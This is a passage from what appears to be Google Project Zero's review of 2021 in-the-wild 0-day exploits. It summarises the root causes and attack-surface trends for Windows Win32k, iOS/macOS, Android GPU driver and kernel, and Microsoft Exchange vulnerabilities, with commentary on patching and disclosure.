class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31956">CVE-2021-31956</a></span><span class="HNYIspzEBn-c0">)</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">The number of different components targeted is the shift from past years. For example, in 2019 75% of Windows 0-days targeted Win32k while in 2021 Win32k only made up 20% of the Windows 0-days. The reason that this was expected and predicted was that 6 out of 8 of those 0-days that targeted Win32k in 2019 did not target the latest release of Windows 10 at that time; they were targeting older versions. With Windows 10 Microsoft began dedicating more and more resources to locking down the attack surface of Win32k so as those older versions have hit end-of-life, Win32k is a less and less attractive attack surface.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Similar to the many Win32k vulnerabilities seen over the years, the </span><span>two 2021 Win32k in-the-wild 0-days are due to custom user callbacks</span><span>. The user calls functions that change the state of an object during the callback and Win32k does not correctly handle those changes. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html">CVE-2021-1732</a></span><span>&nbsp;is a type confusion vulnerability due to a user callback in </span><span class="HNYIspzEBn-c10">xxxClientAllocWindowClassExtraBytes</span><span>&nbsp;which leads to out-of-bounds read and write. If </span><span class="HNYIspzEBn-c10">NtUserConsoleControl</span><span>&nbsp;is called during the callback a flag is set in the window structure to signal that a field is an offset into the kernel heap. </span><span class="HNYIspzEBn-c10">xxxClientAllocWindowClassExtraBytes</span><span>&nbsp;doesn&rsquo;t check this and writes that field as a user-mode pointer without clearing the flag. The first in-the-wild 0-day detected and disclosed in 2022, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-21882.html">CVE-2022-21882</a></span><span>, is due to </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html">CVE-2021-1732</a></span><span>&nbsp;actually not being fixed completely. The attackers found a way to bypass the original patch and still trigger the vulnerability. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://securelist.com/mysterysnail-attacks-with-windows-zero-day/104509/">CVE-2021-40449</a></span><span>&nbsp;is a use-after-free in </span><span class="HNYIspzEBn-c10">NtGdiResetDC</span><span>&nbsp;due to the object being freed during the user callback. </span></p><h2 class="HNYIspzEBn-c7" id="h.dzyrqam42oqk"><span class="HNYIspzEBn-c12">iOS/macOS</span></h2>
 <p class="HNYIspzEBn-c5"><span>As discussed in the &ldquo;More disclosure&rdquo; section above, 2021 was the first full year that Apple annotated their release notes with in-the-wild status of vulnerabilities. 5 iOS in-the-wild 0-days were detected and disclosed this year. The first publicly known macOS in-the-wild 0-day (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/">CVE-2021-30869</a></span><span class="HNYIspzEBn-c0">) was also found. In this section we&rsquo;re going to discuss iOS and macOS together because: 1) the two operating systems include similar components and 2) the sample size for macOS is very small (just this one vulnerability).</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPGaOlQUGIYyvpDY_M0rGh3JekH4mwXHfN459HYcklg74v4Mfp8j6fgh2SM09mjhA4svdgN_TdSN3R5Bb-DJTHnlo63qnRTsvLs1EZgAE3fBpRtsZhxKhyBNTb_khdS6mNT3EtSHnS_R-TshtHx-gSWnEPpHjmSqO_9Y7JxupGcDKZ0-xwsxgbX6zR/s1200/image6%284%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPGaOlQUGIYyvpDY_M0rGh3JekH4mwXHfN459HYcklg74v4Mfp8j6fgh2SM09mjhA4svdgN_TdSN3R5Bb-DJTHnlo63qnRTsvLs1EZgAE3fBpRtsZhxKhyBNTb_khdS6mNT3EtSHnS_R-TshtHx-gSWnEPpHjmSqO_9Y7JxupGcDKZ0-xwsxgbX6zR/s1200/image6%284%29.png" border="0" alt="Bar graph showing the number of macOS and iOS itw 0-days discovered per year. macOs is 0 for every year except 2021 when 1 was discovered. iOS - 2015: 0, 2016: 2, 2017: 0, 2018: 2, 2019: 0, 2020: 3, 2021: 5. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" style="max-height: 750; max-width: 600px; "title="Bar graph showing the number of macOS and iOS itw 0-days discovered per year. macOs is 0 for every year except 2021 when 1 was discovered. iOS - 2015: 0, 2016: 2, 2017: 0, 2018: 2, 2019: 0, 2020: 3, 2021: 5. Data from: https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708" /></a></span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>For the 5 total iOS and macOS in-the-wild 0-days</span><span class="HNYIspzEBn-c0">, they targeted 3 different attack surfaces:</span></p><ul style="padding: 0;" class="c6 lst-kix_givsp5ka59r-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>IOMobileFrameBuffer (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212623">CVE-2021-30807</a></span><span>,</span><span>&nbsp;</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212846">CVE-2021-30883</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>XNU Kernel (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146">CVE-2021-1782</a></span><span>&nbsp;&amp; </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/">CVE-2021-30869</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>CoreGraphics (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">CVE-2021-30860</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>CommCenter</span><span>&nbsp;(</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html">FORCEDENTRY sandbox escape</a></span><span class="HNYIspzEBn-c0">&nbsp;- CVE requested, not yet assigned)</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>These 4 attack surfaces are not novel. IOMobileFrameBuffer has been a target of public security research for many years. For example, </span><span>the Pangu Jailbreak from 2016 used </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.blackhat.com/docs/us-16/materials/us-16-Wang-Pangu-9-Internals.pdf">CVE-2016-4654</a></span><span>, a heap buffer overflow in IOMobileFrameBuffer.</span><span>&nbsp;</span><span>IOMobileFrameBuffer manages the screen&rsquo;s frame buffer. For iPhone 11 (A13) and below, IOMobileFrameBuffer was a kernel driver. Beginning with A14, it runs on a coprocessor, the DCP. &nbsp;It&rsquo;s a popular attack surface because historically it&rsquo;s been accessible from sandboxed apps. In 2021 there were two in-the-wild 0-days in IOMobileFrameBuffer. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212623">CVE-2021-30807</a></span><span>&nbsp;is an out-of-bounds read and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212846">CVE-2021-30883</a></span><span>&nbsp;is an integer overflow, both common memory corruption vulnerabilities. In 2022, we already have another in-the-wild 0-day in IOMobileFrameBuffer, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT213053">CVE-2022-22587</a></span><span class="HNYIspzEBn-c0">.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>One iOS 0-day and the macOS 0-day both exploited vulnerabilities in the XNU kernel and both vulnerabilities were in code related to XNU&rsquo;s inter-process communication (IPC) functionality. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT212146">CVE-2021-1782</a></span><span>&nbsp;exploited a vulnerability in mach vouchers while </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/">CVE-2021-30869</a></span><span>&nbsp;exploited a vulnerability in mach messages. This is not the first time we&rsquo;ve seen </span><span>iOS in-the-wild 0-days</span><span>, much less public security research, targeting mach vouchers and mach messages. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://support.apple.com/en-us/HT209443">CVE-2019-6625</a></span><span>&nbsp;was exploited as a part of </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-5.html">an exploit chain targeting iOS 11.4.1-12.1.2</a></span><span>&nbsp;and was also a </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2019/01/voucherswap-exploiting-mig-reference.html">vulnerability in mach vouchers</a></span><span class="HNYIspzEBn-c0">. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Mach messages have also been a popular target for public security research. In 2020 there were two in-the-wild 0-days also in mach messages: </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html">CVE-2020-27932</a></span><span>&nbsp;&amp; </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27950.html">CVE-2020-27950</a></span><span>. This year&rsquo;s </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/">CVE-2021-30869</a></span><span>&nbsp;is a pretty close variant to 2020&rsquo;s </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html">CVE-2020-27932</a></span><span>. Tielei Wang and Xinru Chi actually </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://github.com/wangtielei/Slides/blob/main/zer0con21.pdf">presented on this vulnerability at zer0con 2021</a></span><span>&nbsp;in April 2021. In their presentation, they explained that they found it while doing variant analysis on </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-27932.html">CVE-2020-27932</a></span><span>. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://twitter.com/WangTielei/status/1486266258152726530">TieLei Wang explained via Twitter</a></span><span class="HNYIspzEBn-c0">&nbsp;that they had found the vulnerability in December 2020 and had noticed it was fixed in beta versions of iOS 14.4 and macOS 11.2 which is why they presented it at Zer0Con. The in-the-wild exploit only targeted macOS 10, but used the same exploitation technique as the one presented.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>The two FORCEDENTRY exploits (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">CVE-2021-30860</a></span><span>&nbsp;and the </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html">sandbox escape</a></span><span>) were the only times that made us all go &ldquo;wow!&rdquo; this year. For </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">CVE-2021-30860</a></span><span>, the integer overflow in CoreGraphics, it was because: </span></p><ol class="c6 lst-kix_qhs0t3wlsx02-0 start" start="1"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">For years we&rsquo;ve all heard about how attackers are using 0-click iMessage bugs and finally we have a public example, and</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">The exploit was an impressive work of art. </span></li></ol>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">The sandbox escape (CVE requested, not yet assigned) was impressive because it&rsquo;s one of the few times we&rsquo;ve seen a sandbox escape in-the-wild that uses only logic bugs, rather than the standard memory corruption bugs. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>For </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">CVE-2021-30860</a></span><span>, the vulnerability itself wasn&rsquo;t especially notable: a classic integer overflow within the JBIG2 parser of the CoreGraphics PDF decoder. The exploit, though, was described by Samuel Gro&szlig; &amp; Ian Beer as &ldquo;one of the most technically sophisticated exploits [they]&rsquo;ve ever seen&rdquo;. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html">Their blogpost shares all the details</a></span><span class="HNYIspzEBn-c0">, but the highlight is that the exploit uses the logical operators available in JBIG2 to build NAND gates which are used to build its own computer architecture. The exploit then writes the rest of its exploit using that new custom architecture. From their blogpost:</span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
 <p class="HNYIspzEBn-c5 HNYIspzEBn-c15"><span class="HNYIspzEBn-c8">Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It&#39;s not as fast as Javascript, but it&#39;s fundamentally computationally equivalent.</span></p>
 <p class="HNYIspzEBn-c2 HNYIspzEBn-c15"><span class="HNYIspzEBn-c8"></span></p>
 <p class="HNYIspzEBn-c5 HNYIspzEBn-c15"><span class="HNYIspzEBn-c8">The bootstrapping operations for the sandbox escape exploit are written to run on this logic circuit and the whole thing runs in this weird, emulated environment created out of a single decompression pass through a JBIG2 stream. It&#39;s pretty incredible, and at the same time, pretty terrifying.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>This is an example of what </span><span>making 0-day exploitation hard could</span><span>&nbsp;look like:</span><span>&nbsp;attackers having to develop a new and novel way to exploit a bug and that method requires lots of expertise and/or time to develop.</span><span>&nbsp;This year, the two FORCEDENTRY exploits were the only 0-days out of the 58 that really impressed us. Hopefully in the future, the bar has been raised such that this will be required for any successful exploitation.</span></p><h2 class="HNYIspzEBn-c7" id="h.tyseasm1qg7w"><span class="HNYIspzEBn-c12">Android</span></h2>
 <p class="HNYIspzEBn-c5"><span>There were 7 Android in-the-wild 0-days detected and disclosed this year. Prior to 2021 there had only been 1 and it was in 2019: </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-2215.html">CVE-2019-2215</a></span><span class="HNYIspzEBn-c0">. Like WebKit, this lack of data makes it hard for us to assess trends and changes. Instead, we&rsquo;ll compare it to public security research.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">For the 7 Android 0-days they targeted the following components:</span></p><ul style="padding: 0;" class="c6 lst-kix_3zaknyhdqv25-0 start"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>Qualcomm Adreno GPU driver (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-01-01">CVE-2020-11261</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html">CVE-2021-1905</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-05-01">CVE-2021-1906</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>ARM Mali GPU driver (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-05-01">CVE-2021-28663</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-05-01">CVE-2021-28664</a></span><span class="HNYIspzEBn-c0">)</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span>Upstream Linux kernel (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html">CVE-2021-1048</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components">CVE-2021-0920</a></span><span class="HNYIspzEBn-c0">)</span></li></ul>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>5 of the 7 0-days from 2021 targeted GPU drivers. This is actually not that surprising when we consider the evolution of the Android ecosystem as well as recent public security research into Android. The Android ecosystem is quite </span><span>fragmented</span><span class="HNYIspzEBn-c0">: many different kernel versions, different manufacturer customizations, etc. If an attacker wants a capability against &ldquo;Android devices&rdquo;, they generally need to maintain many different exploits to have a decent percentage of the Android ecosystem covered. However, if the attacker chooses to target the GPU kernel driver instead of another component, they will only need to have two exploits since most Android devices use 1 of 2 GPUs: either the Qualcomm Adreno GPU or the ARM Mali GPU. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Public security research mirrored this choice in the last couple of years as well. </span><span>When developing full exploit chains</span><span>&nbsp;(for defensive purposes) to target Android devices, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf">Guang Gong</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">Man Yue Mo</a></span><span>, and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html">Ben Hawkes</a></span><span>&nbsp;all chose to attack the GPU kernel driver for local privilege escalation. Seeing the in-the-wild 0-days also target the GPU was more of a confirmation rather than a revelation. Of the </span><span>5 0-days targeting </span><span class="HNYIspzEBn-c0">GPU drivers, 3 were in the Qualcomm Adreno driver and 2 in the ARM Mali driver. </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>The two non-GPU driver 0-days (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components">CVE-2021-0920</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html">CVE-2021-1048</a></span><span>) targeted the upstream Linux kernel. Unfortunately, these 2 bugs shared a singular characteristic with the Android in-the-wild 0-day seen in 2019: all 3 were previously known upstream before their exploitation in Android. While the sample size is small, it&rsquo;s still quite </span><span>striking</span><span>&nbsp;to see that 100% of the known in-the-wild Android 0-days that target the kernel </span><span>are bugs that actually were known about before their exploitation.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>The vulnerability now referred to as </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components">CVE-2021-0920</a></span><span>&nbsp;was actually found in September 2016 and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://lore.kernel.org/lkml/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/">discussed on the Linux kernel mailing lists</a></span><span>. A </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://lore.kernel.org/lkml/1475150954-10152-1-git-send-email-mszeredi@redhat.com/">patch was even developed back in 2016</a></span><span>, but it didn&rsquo;t end up being submitted. The bug was finally </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cbcf01128d0a92e131bd09f1688fe032480b65ca">fixed in the Linux kernel in July 2021</a></span><span>&nbsp;after the detection of the in-the-wild exploit targeting Android. The patch then made it into the </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://source.android.com/security/bulletin/2021-11-01#kernel-components">Android security bulletin in November 2021</a></span><span class="HNYIspzEBn-c0">.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1048.html">CVE-2021-1048</a></span><span class="HNYIspzEBn-c0">&nbsp;remained unpatched in Android for 14 months after it was patched in the Linux kernel. The Linux kernel was actually only vulnerable to the issue for a few weeks, but due to Android patching practices, that few weeks became almost a year for some Android devices. If an Android OEM synced to the upstream kernel, then they likely were patched against the vulnerability at some point. But many devices, such as recent Samsung devices, had not and thus were left vulnerable.</span></p><h2 class="HNYIspzEBn-c7" id="h.go76pditpwq7"><span>Microsoft </span><span>Exchange Server</span></h2>
 <p class="HNYIspzEBn-c5"><span>In 2021, there were 5 in-the-wild 0-days targeting Microsoft Exchange Server. This is the first time any Exchange Server in-the-wild 0-days have been detected and disclosed since we began tracking in-the-wild 0-days. The first four (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html">CVE-2021-26855</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857">CVE-2021-26857</a></span><span>, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858">CVE-2021-26858</a></span><span>, and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065">CVE-2021-27065</a></span><span>) &nbsp;were all disclosed and patched at the same time and used together in a </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">single operation</a></span><span>. </span><span>The fifth (</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321">CVE-2021-42321</a></span><span>) was patched on its own in November 2021. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321">CVE-2021-42321</a></span><span>&nbsp;was demonstrated at Tianfu Cup and then discovered in-the-wild by Microsoft. While no other in-the-wild 0-days were disclosed as part of the chain with </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321">CVE-2021-42321</a></span><span>, the attackers would have required at least another 0-day for successful exploitation since </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321">CVE-2021-42321</a></span><span class="HNYIspzEBn-c0">&nbsp;is a post-authentication bug.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Of the four Exchange in-the-wild 0-days used in the first campaign, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html">CVE-2021-26855</a></span><span>, which is also known as &ldquo;ProxyLogon&rdquo;, is the only one that&rsquo;s pre-auth. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-26855.html">CVE-2021-26855</a></span><span>&nbsp;is a server side request forgery (SSRF) vulnerability that allows unauthenticated attackers to send arbitrary HTTP requests as the Exchange server. The other three vulnerabilities were post-authentication. For example, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858">CVE-2021-26858</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065">CVE-2021-27065</a></span><span>&nbsp;allowed attackers to write arbitrary files to the system. </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857">CVE-2021-26857</a></span><span class="HNYIspzEBn-c0">&nbsp;is a remote code execution vulnerability due to a deserialization bug in the Unified Messaging service. This allowed attackers to run code as the privileged SYSTEM user.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>For the second campaign, </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-42321">CVE-2021-42321</a></span><span>, like </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858">CVE-2021-26858</a></span><span class="HNYIspzEBn-c0">, is a post-authentication RCE vulnerability due to insecure deserialization. It seems that while attempting to harden Exchange, Microsoft inadvertently introduced another deserialization vulnerability.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>While there were a significant amount of 0-days in Exchange detected and disclosed in 2021, it&rsquo;s important to remember that they were all used as 0-day in only two different campaigns. </span><span>This is an example of why we don&rsquo;t suggest </span><span>using the number</span><span class="HNYIspzEBn-c0">&nbsp;of 0-days in a product as a metric to assess the security of a product. Requiring the use of four 0-days for attackers to have success is preferable to an attacker only needing one 0-day to successfully gain access.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>While this is the first time Exchange in-the-wild 0-days have been detected and disclosed</span><span>&nbsp;since Project Zero began our tracking, this is not unexpected. In 2020 there was </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.cisa.gov/uscert/ncas/current-activity/2020/03/10/unpatched-microsoft-exchange-servers-vulnerable-cve-2020-0688">n-day exploitation of Exchange Servers</a></span><span>. Whether this was the first year that attackers began the 0-day exploitation or if this was the first year that defenders began detecting the 0-day exploitation, this is not an unexpected evolution and we&rsquo;ll likely see it continue into 2022.</span></p><h1 class="HNYIspzEBn-c11" id="h.1cg90di44ry5"><span>Outstanding Questions</span></h1>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">While there has been progress on detection and disclosure, that progress has shown just how much work there still is to do. The more data we gained, the more questions that arose about biases in detection, what we&rsquo;re missing and why, and the need for more transparency from both vendors and researchers.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
